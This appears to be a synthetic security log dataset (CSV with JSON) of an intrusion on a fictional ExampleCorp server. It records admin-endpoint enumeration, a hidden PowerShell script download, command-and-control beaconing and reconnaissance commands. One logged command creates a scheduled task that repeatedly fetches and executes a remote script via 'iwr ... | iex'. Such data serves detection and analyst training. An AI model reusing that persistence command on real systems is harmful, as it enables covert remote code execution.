@timestamp,event.dataset,event.action,host.name,host.ip,user.name,source.ip,destination.ip,destination.port,url.full,process.name,process.command_line,file.path,file.hash.sha256,email.subject,raw,json
2024-12-10T12:10:26Z,terminal,command,SRV-APP-01,10.10.7.15,svc_app,,,,,,,,,,"2024-12-10T12:10:26Z svc_app@SRV-APP-01$ whoami
examplecorp\svc_app","{""@timestamp"": ""2024-12-10T12:10:26Z"", ""event"": {""dataset"": ""terminal"", ""action"": ""command"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""2024-12-10T12:10:26Z svc_app@SRV-APP-01$ whoami\nexamplecorp\\svc_app"", ""host"": {""name"": ""SRV-APP-01"", ""ip"": [""10.10.7.15""]}, ""user"": {""name"": ""svc_app"", ""email"": null}, ""terminal"": {""command"": ""whoami"", ""output"": ""examplecorp\\svc_app""}}"
2024-12-10T12:10:26Z,network,http,SRV-APP-01,10.10.7.15,svc_app,203.0.113.88,10.10.7.15,443,https://app.company.com/admin/api/debug,,,,,,WAF: suspicious enumeration of admin endpoints,"{""@timestamp"": ""2024-12-10T12:10:26Z"", ""event"": {""dataset"": ""network"", ""action"": ""http"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""WAF: suspicious enumeration of admin endpoints"", ""host"": {""name"": ""SRV-APP-01"", ""ip"": [""10.10.7.15""]}, ""user"": {""name"": ""svc_app"", ""email"": null}, ""source"": {""ip"": ""203.0.113.88""}, ""destination"": {""ip"": ""10.10.7.15"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""protocol"": ""http"", ""bytes"": 1500}, ""http"": {""request"": {""method"": ""GET""}, ""response"": {""status_code"": 200}}, ""url"": {""full"": ""https://app.company.com/admin/api/debug""}, ""user_agent"": {""original"": ""Mozilla/5.0""}}"
2024-12-10T12:10:29Z,network,http,SRV-APP-01,10.10.7.15,svc_app,203.0.113.88,10.10.7.15,443,https://app.company.com/admin/api/debug,,,,,,WAF: suspicious enumeration of admin endpoints,"{""@timestamp"": ""2024-12-10T12:10:29Z"", ""event"": {""dataset"": ""network"", ""action"": ""http"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""WAF: suspicious enumeration of admin endpoints"", ""host"": {""name"": ""SRV-APP-01"", ""ip"": [""10.10.7.15""]}, ""user"": {""name"": ""svc_app"", ""email"": null}, ""source"": {""ip"": ""203.0.113.88""}, ""destination"": {""ip"": ""10.10.7.15"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""protocol"": ""http"", ""bytes"": 1500}, ""http"": {""request"": {""method"": ""GET""}, ""response"": {""status_code"": 200}}, ""url"": {""full"": ""https://app.company.com/admin/api/debug""}, ""user_agent"": {""original"": ""Mozilla/5.0""}}"
2024-12-10T12:10:32Z,network,http,SRV-APP-01,10.10.7.15,svc_app,203.0.113.88,10.10.7.15,443,https://app.company.com/admin/api/health,,,,,,WAF: suspicious enumeration of admin endpoints,"{""@timestamp"": ""2024-12-10T12:10:32Z"", ""event"": {""dataset"": ""network"", ""action"": ""http"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""WAF: suspicious enumeration of admin endpoints"", ""host"": {""name"": ""SRV-APP-01"", ""ip"": [""10.10.7.15""]}, ""user"": {""name"": ""svc_app"", ""email"": null}, ""source"": {""ip"": ""203.0.113.88""}, ""destination"": {""ip"": ""10.10.7.15"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""protocol"": ""http"", ""bytes"": 1500}, ""http"": {""request"": {""method"": ""GET""}, ""response"": {""status_code"": 200}}, ""url"": {""full"": ""https://app.company.com/admin/api/health""}, ""user_agent"": {""original"": ""Mozilla/5.0""}}"
2024-12-10T12:11:00Z,network,dns,SRV-APP-01,10.10.7.15,svc_app,10.10.7.15,,,,,,,,,DNS: query=officecdn.microsoft.com answer=13.107.6.152 ttl=300,"{""@timestamp"": ""2024-12-10T12:11:00Z"", ""event"": {""dataset"": ""network"", ""action"": ""dns"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""DNS: query=officecdn.microsoft.com answer=13.107.6.152 ttl=300"", ""host"": {""name"": ""SRV-APP-01"", ""ip"": [""10.10.7.15""]}, ""user"": {""name"": ""svc_app"", ""email"": null}, ""source"": {""ip"": ""10.10.7.15""}, ""dns"": {""question"": {""name"": ""officecdn.microsoft.com""}, ""answers"": [{""data"": ""13.107.6.152"", ""ttl"": 300}]}}"
2024-12-10T12:11:06Z,network,flow,SRV-APP-01,10.10.7.15,svc_app,10.10.7.15,13.107.6.152,443,,,,,,,FLOW: benign TLS traffic,"{""@timestamp"": ""2024-12-10T12:11:06Z"", ""event"": {""dataset"": ""network"", ""action"": ""flow"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""FLOW: benign TLS traffic"", ""host"": {""name"": ""SRV-APP-01"", ""ip"": [""10.10.7.15""]}, ""user"": {""name"": ""svc_app"", ""email"": null}, ""source"": {""ip"": ""10.10.7.15""}, ""destination"": {""ip"": ""13.107.6.152"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""bytes"": 5800}}"
2024-12-10T12:11:15Z,network,dns,SRV-APP-01,10.10.7.15,svc_app,10.10.7.15,,,,,,,,,DNS: query=ctldl.windowsupdate.com answer=13.107.4.50 ttl=300,"{""@timestamp"": ""2024-12-10T12:11:15Z"", ""event"": {""dataset"": ""network"", ""action"": ""dns"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""DNS: query=ctldl.windowsupdate.com answer=13.107.4.50 ttl=300"", ""host"": {""name"": ""SRV-APP-01"", ""ip"": [""10.10.7.15""]}, ""user"": {""name"": ""svc_app"", ""email"": null}, ""source"": {""ip"": ""10.10.7.15""}, ""dns"": {""question"": {""name"": ""ctldl.windowsupdate.com""}, ""answers"": [{""data"": ""13.107.4.50"", ""ttl"": 300}]}}"
2024-12-10T12:11:30Z,network,dns,SRV-APP-01,10.10.7.15,svc_app,10.10.7.15,,,,,,,,,DNS: query=login.microsoftonline.com answer=20.190.155.134 ttl=300,"{""@timestamp"": ""2024-12-10T12:11:30Z"", ""event"": {""dataset"": ""network"", ""action"": ""dns"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""DNS: query=login.microsoftonline.com answer=20.190.155.134 ttl=300"", ""host"": {""name"": ""SRV-APP-01"", ""ip"": [""10.10.7.15""]}, ""user"": {""name"": ""svc_app"", ""email"": null}, ""source"": {""ip"": ""10.10.7.15""}, ""dns"": {""question"": {""name"": ""login.microsoftonline.com""}, ""answers"": [{""data"": ""20.190.155.134"", ""ttl"": 300}]}}"
2024-12-10T12:11:36Z,network,flow,SRV-APP-01,10.10.7.15,svc_app,10.10.7.15,20.190.155.134,443,,,,,,,FLOW: benign TLS traffic,"{""@timestamp"": ""2024-12-10T12:11:36Z"", ""event"": {""dataset"": ""network"", ""action"": ""flow"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""FLOW: benign TLS traffic"", ""host"": {""name"": ""SRV-APP-01"", ""ip"": [""10.10.7.15""]}, ""user"": {""name"": ""svc_app"", ""email"": null}, ""source"": {""ip"": ""10.10.7.15""}, ""destination"": {""ip"": ""20.190.155.134"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""bytes"": 5800}}"
2024-12-10T12:11:45Z,network,dns,SRV-APP-01,10.10.7.15,svc_app,10.10.7.15,,,,,,,,,DNS: query=clients2.google.com answer=142.250.74.78 ttl=300,"{""@timestamp"": ""2024-12-10T12:11:45Z"", ""event"": {""dataset"": ""network"", ""action"": ""dns"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""DNS: query=clients2.google.com answer=142.250.74.78 ttl=300"", ""host"": {""name"": ""SRV-APP-01"", ""ip"": [""10.10.7.15""]}, ""user"": {""name"": ""svc_app"", ""email"": null}, ""source"": {""ip"": ""10.10.7.15""}, ""dns"": {""question"": {""name"": ""clients2.google.com""}, ""answers"": [{""data"": ""142.250.74.78"", ""ttl"": 300}]}}"
2024-12-10T12:12:00Z,network,dns,SRV-APP-01,10.10.7.15,svc_app,10.10.7.15,,,,,,,,,DNS first_seen cdn-patch-check.net -> 77.91.84.162,"{""@timestamp"": ""2024-12-10T12:12:00Z"", ""event"": {""dataset"": ""network"", ""action"": ""dns"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""DNS first_seen cdn-patch-check.net -> 77.91.84.162"", ""host"": {""name"": ""SRV-APP-01"", ""ip"": [""10.10.7.15""]}, ""user"": {""name"": ""svc_app"", ""email"": null}, ""source"": {""ip"": ""10.10.7.15""}, ""dns"": {""question"": {""name"": ""cdn-patch-check.net""}, ""answers"": [{""data"": ""77.91.84.162"", ""ttl"": 60}]}}"
2024-12-10T12:12:06Z,network,flow,SRV-APP-01,10.10.7.15,svc_app,10.10.7.15,77.91.84.162,443,,,,,,,TLS download sni=cdn-patch-check.net bytes_in~45KB,"{""@timestamp"": ""2024-12-10T12:12:06Z"", ""event"": {""dataset"": ""network"", ""action"": ""flow"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""TLS download sni=cdn-patch-check.net bytes_in~45KB"", ""host"": {""name"": ""SRV-APP-01"", ""ip"": [""10.10.7.15""]}, ""user"": {""name"": ""svc_app"", ""email"": null}, ""source"": {""ip"": ""10.10.7.15""}, ""destination"": {""ip"": ""77.91.84.162"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""bytes"": 45900}}"
2024-12-10T12:12:10Z,endpoint,file_write,SRV-APP-01,10.10.7.15,svc_app,,,,,,,C:\ProgramData\patch.ps1,d4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcdef0abcde,,EDR: suspicious script written to ProgramData,"{""@timestamp"": ""2024-12-10T12:12:10Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""file_write"", ""kind"": ""event"", ""category"": [""file""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""EDR: suspicious script written to ProgramData"", ""host"": {""name"": ""SRV-APP-01"", ""ip"": [""10.10.7.15""]}, ""user"": {""name"": ""svc_app"", ""email"": null}, ""file"": {""path"": ""C:\\ProgramData\\patch.ps1"", ""hash"": {""sha256"": ""d4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcdef0abcde""}}}"
2024-12-10T12:12:12Z,endpoint,process_start,SRV-APP-01,10.10.7.15,svc_app,,,,,powershell.exe,powershell.exe -NoP -W Hidden -File C:\ProgramData\patch.ps1,,,,EDR: executed downloaded script,"{""@timestamp"": ""2024-12-10T12:12:12Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""process_start"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""EDR: executed downloaded script"", ""host"": {""name"": ""SRV-APP-01"", ""ip"": [""10.10.7.15""]}, ""user"": {""name"": ""svc_app"", ""email"": null}, ""process"": {""name"": ""powershell.exe"", ""pid"": 6230, ""parent"": {""name"": ""cmd.exe"", ""pid"": 6100}, ""command_line"": ""powershell.exe -NoP -W Hidden -File C:\\ProgramData\\patch.ps1""}}"
2024-12-10T12:13:00Z,endpoint,process_start,SRV-APP-01,10.10.7.15,svc_app,,,,,schtasks.exe,"schtasks /Create /SC MINUTE /MO 10 /TN ""JavaUpdate"" /TR ""powershell -w hidden -c iwr https://cdn-patch-check.net/patch.ps1 | iex"" /F",,,,EDR: scheduled task persistence created,"{""@timestamp"": ""2024-12-10T12:13:00Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""process_start"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""EDR: scheduled task persistence created"", ""host"": {""name"": ""SRV-APP-01"", ""ip"": [""10.10.7.15""]}, ""user"": {""name"": ""svc_app"", ""email"": null}, ""process"": {""name"": ""schtasks.exe"", ""pid"": 6300, ""parent"": {""name"": ""powershell.exe"", ""pid"": 6230}, ""command_line"": ""schtasks /Create /SC MINUTE /MO 10 /TN \""JavaUpdate\"" /TR \""powershell -w hidden -c iwr https://cdn-patch-check.net/patch.ps1 | iex\"" /F""}}"
2024-12-10T12:14:00Z,network,flow,SRV-APP-01,10.10.7.15,svc_app,10.10.7.15,77.91.84.162,443,,,,,,,TLS beacon sni=cdn-patch-check.net,"{""@timestamp"": ""2024-12-10T12:14:00Z"", ""event"": {""dataset"": ""network"", ""action"": ""flow"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""TLS beacon sni=cdn-patch-check.net"", ""host"": {""name"": ""SRV-APP-01"", ""ip"": [""10.10.7.15""]}, ""user"": {""name"": ""svc_app"", ""email"": null}, ""source"": {""ip"": ""10.10.7.15""}, ""destination"": {""ip"": ""77.91.84.162"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""bytes"": 2500}}"
2024-12-10T12:15:05Z,terminal,command,SRV-APP-01,10.10.7.15,svc_app,,,,,,,,,,"2024-12-10T12:15:05Z svc_app@SRV-APP-01$ whoami /priv
(output truncated)","{""@timestamp"": ""2024-12-10T12:15:05Z"", ""event"": {""dataset"": ""terminal"", ""action"": ""command"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""2024-12-10T12:15:05Z svc_app@SRV-APP-01$ whoami /priv\n(output truncated)"", ""host"": {""name"": ""SRV-APP-01"", ""ip"": [""10.10.7.15""]}, ""user"": {""name"": ""svc_app"", ""email"": null}, ""terminal"": {""command"": ""whoami /priv"", ""output"": ""(output truncated)""}}"
2024-12-10T12:15:10Z,network,flow,SRV-APP-01,10.10.7.15,svc_app,10.10.7.15,77.91.84.162,443,,,,,,,TLS beacon sni=cdn-patch-check.net,"{""@timestamp"": ""2024-12-10T12:15:10Z"", ""event"": {""dataset"": ""network"", ""action"": ""flow"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""TLS beacon sni=cdn-patch-check.net"", ""host"": {""name"": ""SRV-APP-01"", ""ip"": [""10.10.7.15""]}, ""user"": {""name"": ""svc_app"", ""email"": null}, ""source"": {""ip"": ""10.10.7.15""}, ""destination"": {""ip"": ""77.91.84.162"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""bytes"": 2500}}"
2024-12-10T12:15:23Z,terminal,command,SRV-APP-01,10.10.7.15,svc_app,,,,,,,,,,"2024-12-10T12:15:23Z svc_app@SRV-APP-01$ ipconfig /all
(output truncated)","{""@timestamp"": ""2024-12-10T12:15:23Z"", ""event"": {""dataset"": ""terminal"", ""action"": ""command"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""2024-12-10T12:15:23Z svc_app@SRV-APP-01$ ipconfig /all\n(output truncated)"", ""host"": {""name"": ""SRV-APP-01"", ""ip"": [""10.10.7.15""]}, ""user"": {""name"": ""svc_app"", ""email"": null}, ""terminal"": {""command"": ""ipconfig /all"", ""output"": ""(output truncated)""}}"
2024-12-10T12:15:41Z,terminal,command,SRV-APP-01,10.10.7.15,svc_app,,,,,,,,,,"2024-12-10T12:15:41Z svc_app@SRV-APP-01$ tasklist
(output truncated)","{""@timestamp"": ""2024-12-10T12:15:41Z"", ""event"": {""dataset"": ""terminal"", ""action"": ""command"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""2024-12-10T12:15:41Z svc_app@SRV-APP-01$ tasklist\n(output truncated)"", ""host"": {""name"": ""SRV-APP-01"", ""ip"": [""10.10.7.15""]}, ""user"": {""name"": ""svc_app"", ""email"": null}, ""terminal"": {""command"": ""tasklist"", ""output"": ""(output truncated)""}}"
2024-12-10T12:15:59Z,terminal,command,SRV-APP-01,10.10.7.15,svc_app,,,,,,,,,,"2024-12-10T12:15:59Z svc_app@SRV-APP-01$ sc query type= service
(output truncated)","{""@timestamp"": ""2024-12-10T12:15:59Z"", ""event"": {""dataset"": ""terminal"", ""action"": ""command"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""2024-12-10T12:15:59Z svc_app@SRV-APP-01$ sc query type= service\n(output truncated)"", ""host"": {""name"": ""SRV-APP-01"", ""ip"": [""10.10.7.15""]}, ""user"": {""name"": ""svc_app"", ""email"": null}, ""terminal"": {""command"": ""sc query type= service"", ""output"": ""(output truncated)""}}"
